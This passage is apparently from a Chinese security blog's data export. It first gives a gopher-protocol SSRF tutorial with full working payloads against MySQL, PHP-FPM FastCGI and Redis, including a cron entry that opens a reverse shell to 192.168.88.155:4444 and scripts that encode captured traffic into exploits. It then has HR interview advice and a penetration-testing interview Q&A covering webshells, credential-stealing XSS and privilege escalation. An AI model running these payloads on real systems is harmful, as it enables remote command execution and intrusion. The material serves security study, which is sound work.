gopher:&#x2F;&#x2F;192.168.40.155:3306&#x2F;_%42%00%00%01%85%a6%3f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%73%65%72%6e%6f%70%61%73%73%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%01%00%00%00%01 --output - &gt; mysql.txt 使用strings命令读取mysql.txt，获得输出结果。 1strings mysql.txt gopher攻击fastcgiphp-fpm一般监听在127.0.0.1的9000端口上，当存在未授权访问漏洞时，利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。 12345前提条件：PHP-FPM监听端口PHP-FPM版本 &gt;&#x3D; 5.3.3libcurl版本&gt;&#x3D;7.45.0(curl版本小于7.45.0时，gopher的%00会被截断)知道服务器上任意一个php文件的绝对路径，例如&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php 首先监听2333端口的流量，并将输出保存成1.txt 1nc -nvvlp 2333 &gt; 1.txt 执行fpm.py，得到poc代码 1python fpm.py 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php -c &#39;&lt;?php echo &#96;id&#96;; exit;?&gt;&#39; -p 2333 使用如下脚本，将poc代码进行编码，得到gopher攻击的payload 123456789import urllibdef go(): f &#x3D; open(&quot;1.txt&quot;) content &#x3D; f.read() print urllib.quote(content) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: go() 使用curl命令发送payload，成功执行了系统命令 1curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%96%A2%00%08%00%00%00%01%00%00%00%00%00%00%01%04%96%A2%01%E7%00%00%0E%02CONTENT_LENGTH24%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%0B%1BSCRIPT_NAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%01%04%96%A2%00%00%00%00%01%05%96%A2%00%18%00%00%3C%3Fphp%20echo%20%60id%60%3B%20exit%3B%3F%3E%01%05%96%A2%00%00%00%00&quot; gopher攻击redis如果内网中的redis存在未授权访问漏洞，当Redis服务以root 权限运行时，利用 Gopher 协议攻击内网中的 Redis，通过写入定时任务可以实现反弹shell。 使用socat进行端口转发，将本地的4444端口转发到目标的6379端口，此时访问本地的4444端口，其实是访问目标的6379端口。 1socat -v tcp-listen:4444,fork tcp-connect:192.168.88.158:6379 执行以下bash脚本 1bash redis_cron.sh 127.0.0.1 4444 12345echo -e &quot;\\n\\n\\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 捕获到攻击redis的数据包，保存成socat.log 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&gt; 2019&#x2F;02&#x2F;01 02:04:10.385362 length&#x3D;90 from&#x3D;0 to&#x3D;89*3\\r$3\\rset\\r$1\\r1\\r$63\\r*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1\\r&lt; 2019&#x2F;02&#x2F;01 02:04:10.387206 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;02&#x2F;01 02:04:10.390057 length&#x3D;57 from&#x3D;0 to&#x3D;56*4\\r$6\\rconfig\\r$3\\rset\\r$3\\rdir\\r$16\\r&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\\r&lt; 2019&#x2F;02&#x2F;01 02:04:10.392226 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;02&#x2F;01 02:04:10.394801 length&#x3D;52 from&#x3D;0 to&#x3D;51*4\\r$6\\rconfig\\r$3\\rset\\r$10\\rdbfilename\\r$4\\rroot\\r&lt; 2019&#x2F;02&#x2F;01 02:04:10.396341 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;02&#x2F;01 02:04:10.399187 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rsave\\r&lt; 2019&#x2F;02&#x2F;01 02:04:10.409391 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r&gt; 2019&#x2F;02&#x2F;01 02:04:10.419846 length&#x3D;14 from&#x3D;0 to&#x3D;13*1\\r$4\\rquit\\r&lt; 2019&#x2F;02&#x2F;01 02:04:10.420636 length&#x3D;5 from&#x3D;0 to&#x3D;4+OK\\r 使用以下脚本将数据包进行转码，得到poc 123456789101112131415161718192021222324252627#coding: utf-8#author: JoyChouimport sysexp &#x3D; &#39;&#39;with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in &#39;&gt;&lt;+&#39;: continue # 判断倒数第2、3字符串是否为\\r elif line[-3:-1] &#x3D;&#x3D; r&#39;\\r&#39;: # 如果该行只有\\r，将\\r替换成%0a%0d%0a if len(line) &#x3D;&#x3D; 3: exp &#x3D; exp + &#39;%0a%0d%0a&#39; else: line &#x3D; line.replace(r&#39;\\r&#39;, &#39;%0d%0a&#39;) # 去掉最后的换行符 line &#x3D; line.replace(&#39;\\n&#39;, &#39;&#39;) exp &#x3D; exp + line # 判断是否是空行，空行替换为%0a elif line &#x3D;&#x3D; &#39;\\x0a&#39;: exp &#x3D; exp + &#39;%0a&#39; else: line &#x3D; line.replace(&#39;\\n&#39;, &#39;&#39;) exp &#x3D; exp + lineprint exp 使用curl命令进行测试，成功接收到反弹shell 1curl -v &#39;gopher:&#x2F;&#x2F;192.168.88.158:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;","categories":[{"name":"漏洞详解","slug":"漏洞详解","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"人事面经","slug":"人事面经","date":"2020-02-26T04:17:19.000Z","updated":"2020-02-26T04:17:46.808Z","comments":true,"path":"2020/02/26/人事面经/","link":"","permalink":"http://yoursite.com/2020/02/26/%E4%BA%BA%E4%BA%8B%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"HR面注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！ 问题对我们公司有什么了解，为什么选择本公司在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品） 为什么想要应聘这个职位从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力） 对安全服务是怎么理解的安全服务对象是人， 渗透测试对象是网站。（我的理解） 安全概念和资讯 安全工具使用 渗透测试 安全基线检查 应急响应 代码审计 安全边界建设 安全规范 如果我不知道渗透测试，两分钟说一下（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内） 如果我是一个汽车厂商，你如何证明你的工作是有意义的？（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用） 作为应届生，你如何能胜任该职位正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位 你有什么职业规划渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问） 如果离职的话是因为什么原因个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 打架 不和，也不要明说……） 你有什么优缺点 优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强 缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点） 对于薪资的要求月薪13-15K，可以接受1k的浮动 给不了这么多工资可以接受吗？为什么想要这个数？ 贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场） 可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误） 通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信） （这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 https://www.zhihu.com/question/282880854/answer/432987673 ） 进入部门后，你需要多长时间进入项目？（表达自己的快速学习能力） 上一个面试的人能力跟你差不多，但是工资方面比你要的低？（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等） 是否可以接受加班加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;） （沟通能力）和领导、同事产生分歧会怎么办出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。 工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点） 对上司有什么要求？喜欢和什么样的领导合作？我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。 最有影响的一件事/人（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域） 你还要问什么问题 有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？ 五险一金、社保比例、饭补、餐补、交通补助？ 应聘岗位具体职责和工作内容？会不会经常出差？ 试用期多久？薪水多少？","categories":[{"name":"面经总结","slug":"面经总结","permalink":"http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"面经","slug":"面经","permalink":"http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"}]},{"title":"面试面经","slug":"技术面经","date":"2020-02-26T03:07:03.000Z","updated":"2020-02-27T07:54:54.511Z","comments":true,"path":"2020/02/26/技术面经/","link":"","permalink":"http://yoursite.com/2020/02/26/%E6%8A%80%E6%9C%AF%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"sql注入时碰到update型和insert型，你会利用哪种 1insert型，避免对原数据作出修改。 进入后台后看到密码全为*号，此时应该怎么做 12右键，查看网页源码修改type属性 介绍你挖掘的一个思路新奇的漏洞 了解内网吗？ 在论坛（看雪、t00ls等）发表过哪些文章 开发能力怎么样？开发过哪些项目，有参与开源的经历吗 如何反弹shell 你维护着一个博客，如何防止被黑客攻击 没有回显，如何确定可以执行命令 介绍下apache解析漏洞 用几句话介绍下sql注入的本质 如何防御sql注入 写过多线程吗？ 熟悉tcp/ip吗？ 有网络编程的经验吗 熟悉缓存吗？比如redis 了解python线程、进程、携程的区别吗 用过python哪些库 用python做过哪些项目，介绍一下 你之前的渗透测试报告？ 中了勒索病毒怎么应急？ php有哪些危险函数？ 三级等保口令复杂度？ 对正则了解吗？ python爬虫怎么运用？ 说明一次完整的渗透经历？ 简单的介绍下你的工作内容 你熟悉那种数据库（mysql/mssql） 你熟悉手工注入吗？ 简单说下你遇到的CSRF 简述下XSS SQL注入的形成 说说你对盲注的理解 什么叫本地包含漏洞 当mysql是普通用户时怎么提权 当MYSQL为ROOT时怎么提权 apache/nginx配置文件的位置 什么叫二次注入 如何让不不同目录用户不能相互访问 python的L模型（这里我真不知道这是啥。。） python如何发起一个http请求（感觉面试官好无聊） 当httponly 如何获取COOKIE mysql提权有那几种？ mssql提权有那几种？ 你会什么语言？restapi用得熟悉吗？ 你写过大型项目吗？ 当php写得WEB没有任何漏洞你如何渗透？ 如何信息收集，应该收集那些信息？ 你了解哪些漏洞？ 你挖到的逻辑漏洞有哪些？ 你参加过ctf？ 你写过漏洞报告吗？(src) 部署过dwva吗？ 用过哪些工具？ 你拿到过webshell吗？ 你在哪些src发过漏洞，截图？ 你写过哪些脚本？原理？ linux提权？ windows提权？ mysql提权？ linux配置登录次数文件在哪个目录下面？ 谈谈你绕waf的经历和经验？ 请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。端口：21、22、873、1433、3306、6379、11211 你所知道的网络抓包工具有哪些？对android或者ios设备怎么进行抓包。 请说明黑客常用的清除痕迹的方式及对应的监控方法（linux和windows系统） 罗列最近几年影响较大的安全漏洞并请大概介绍其原理、危害（请列举3个） 拿到一个待检测的站，你觉得应该先做什么？收集信息whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息另说… mysql的网站注入，5.0以上和5.0以下有什么区别？ 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。5.0以下是多用户单操作，5.0以上是多用户多操做。 3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。 4.判断出网站的CMS对渗透有什么意义？查找网上已曝光的程序漏洞。如果开源，还能下载相对应的源码进行代码审计。 5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？敏感文件、二级目录扫描站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 6.常见的网站服务器容器。IIS、Apache、nginx、Lighttpd、Tomcat 7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？root权限以及网站的绝对路径。 8.目前已知哪些版本的容器有解析漏洞，具体举例。IIS 6.0/xx.asp/xx.jpg “xx.asp”是文件夹名IIS 7.0/7.5默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析Nginx版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。空字节代码 xxx.jpg%00.phpApache上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀lighttpdxx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！ 9.如何手工快速判断目标站是windows还是linux服务器？linux大小写敏感,windows大小写不敏感。 10.为何一个mysql数据库的站，只有一个80端口开放？更改了端口，没有扫描出来。站库分离。3306端口不对外开放 11.3389无法连接的几种情况。没开放3389 端口端口被修改防护拦截处于内网(需进行端口转发) 12.如何突破注入时字符被转义？宽字符注入hex编码绕过 13.在某后台新闻编辑界面看到编辑器，应该先做什么？查看编辑器的名称版本,然后搜索公开的漏洞。 14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？能做的事情很多，用隐藏网马来举例子：插入&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php .jpg文件会被解析成.php文件。具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 15.注入漏洞只能查账号密码？只要权限广，拖库脱到老。 16.安全狗会追踪变量，从而发现出是一句话木马吗？是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。 17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。迅雷下载，直接改后缀为.mdb。 18.提权时选择可读写目录，为何尽量不用带空格的目录？因为exp执行多半需要空格界定参数 19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？同数据库。 20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 21:某个防注入系统，在注入时会提示：系统检测到你有非法注入的行为。已记录您的ip xx.xx.xx.xx时间:2016:01-23提交页面:test.asp?id=15提交内容:and 1=1如何利用这个防注入系统拿shell？在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。 22.上传大马后访问乱码时，有哪些解决办法？浏览器中改编码。 23.审查上传点的元素有什么意义？有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？先爆破用户名，再利用被爆破出来的用户名爆破密码。其实有些站点，在登陆处也会这样提示所有和数据库有交互的地方都有可能有注入。 25.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？直接在网站二级目录/abc/下扫描敏感文件及目录。 27.在有shell的情况下，如何使用xss实现对目标站的长久控制？后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。在登录后才可以访问的文件中插入XSS脚本。 28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？审查元素 把密码处的password属性改成text就明文显示了 29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过 30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。 31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？隐藏文件夹，为了不让管理员发现你传上去的工具。 32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：A. demo.jsp?id=2+1 B. demo.jsp?id=2-1选B，在 URL 编码中 + 代表空格，可能会造成混淆 33、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？demo.do?DATA=AjAxNg==DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 34、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell 35、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验RefererXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 36、CSRF、SSRF和重放攻击有什么区别？CSRF是跨站请求伪造攻击，由客户端发起SSRF是服务器端请求伪造，由服务器发起重放攻击是将截获的数据包进行重放，达到身份认证等目的 37、说出至少三种业务逻辑漏洞，以及修复方式？密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码身份认证漏洞中最常见的是会话固定攻击和 Cookie 仿冒，只要得到 Session 或 Cookie 即可伪造用户身份验证码漏洞中存在验证码允许暴力破解、验证码可以通过 Javascript 或者改包的方法来进行绕过 38、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”HTTP/1.1Host:****.com:82User-Agent:Mozilla/ 5.0 Firefox/40Accept:text/css,/;q=0.1Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3Referer:http://****.com/eciop/orderForCC/cgtListForCC.htm?zone=11370601&amp;v=145902Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;st_uid=N90PLYHLZGJXI-NX01VPUF46W;status=TrueConnection:keep-alive 39、找一类你最擅长的漏洞，谈下绕过漏洞修复后的方案？ 40、你常用的渗透工具有哪些，最常用的是哪个？ 41、描述一个你深入研究过的 CVE 或 POC。 42、谈谈你经常关注的安全平台？ SQL的存储引擎 SQL注入写shell的条件，用法 GPC是什么？开启了怎么绕过 Mysql一个@和两个@什么区别 IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞 wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化 linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定 三种主要的at batch cron，一般使用cron在规定的时间执行命令 挖过最难的漏洞是什么 ukelink 病毒和蠕虫的区别 DNS欺骗是什么 定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。 DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议陆地land攻击是什么 xss有什么？执行存储型的xss的危害和原理 渗透测试流程？（不够清晰，太浅显 有没有移动端的调试经验 apk,ipa包分析 对于云安全的理解 权限管理，内网威胁，信息泄露，过于依赖托管厂商 虚拟机逃逸的理解 虚拟机之间通信或上层主机的通信 英语介绍一下自己 职业路径 大学做过什么相关的事情 在工作会做什么来不断提高自己的能力 渗透测试流程 描述渗透项目，做了什么 xss漏洞类型、详情、修复方案 SQL注入原理、类型，waf绕过，写shell，提权，修复方案 终端的渗透经验 了解什么比较新的漏洞 企业内部安全 算法？了解过什么排序？ 快速排序 冒泡排序 爬虫 页面存在很多js的时候，用什么phnatomJS selenium execjs 爬虫的待爬取URL量级比较大的时候，如何对其去重在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大使用Map或是一个定长数组记录某一个URL是否被访问过布隆过滤器(bloom filter)，bitmap 多线程 异步 协程 多路复用 用哪一个最快 为什么https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈 IO多路复用 异步阻塞IO 线程轮询IO 浏览器的常用编码一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 http://www.runoob.com/http/http-content-type.html web常用的加密算法有什么非对称加密 RSA、ElGamal、Rabin 对称加密 DES、3DES、AES 散列算法 MD5 SHA base64 有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？拿下机器后 内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁 这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的 拿到的各种记录 会暴露出部分内网通讯的ip，内网内弱口令占大多数 FTP MSSQL 远程桌面链接 mysql中like查询会会非常缓慢，如何进行优化分词索引 做了cdn的网站如何获取真实IP多地ping看是否有cdn邮件订阅或者rss订阅二级域名可能不会做cdnnslookup http://xxx.com 国外dns查找域名历史解析记录，因为域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址 https://toolbar.netcraft.com/site_report?url=www.xxx.comphpinfo上显示的信息 渗透的时候如何隐藏自己的身份 主机疑似遭到入侵，要看哪里的日志 SQL注入漏洞怎么修复 安全研究的方面？做过哪些渗透测试的工作？ 只给你一个网址，如何进行渗透测试 SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？ sleep被禁用后还能怎么进行sql注入BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。 mysql：AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C); XSS可以控制属性怎么利用 CSRF怎么防护？尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token 请求头中哪些是有危害的？ Cookie XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。 xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务 探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析 Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：javax.xml.stream.XMLStreamReader;javax.xml.parsers.DocumentBuilderFactory; JAVA中间件的漏洞，举几个例子？常见的是反序列化漏洞 IIS常见的漏洞常见的为解析漏洞，6.0有 /test.asp/test.jpg test.asp;.jpg 7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx 原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。 python有哪些框架，其中出现过哪些漏洞flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。 模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值 如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。 还可以利用模板中html标签属性字段绕过xss过滤。 Django出现过目录遍历漏洞 业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？ PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？ HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie Http 